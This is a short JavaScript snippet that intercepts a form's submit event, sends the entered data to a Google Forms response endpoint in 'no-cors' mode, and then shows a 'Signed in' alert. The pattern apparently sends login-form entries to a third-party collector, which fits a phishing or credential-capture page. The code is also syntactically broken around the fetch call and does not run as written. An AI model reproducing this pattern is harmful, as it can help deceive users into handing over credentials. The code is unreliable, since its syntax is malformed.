document.getElementById("googleform").addEventListener("submit", function(event){
    event.preventDefault();

    let formData = new
        FormData(this);

fetch("https://docs.google.com/forms/u/0/d/e/1FAIpQLSeuIrXuZsHFo5calRABB43VFj8HGRipnXUL0W7kIG-AcrBOfA/formResponse")
    method: "POST",
        body: formData,
        mode: "no-cors"}). then(response => { alert("Signed in");
                                            }).catch(error =>
    console.error("ERROR:", error));
});
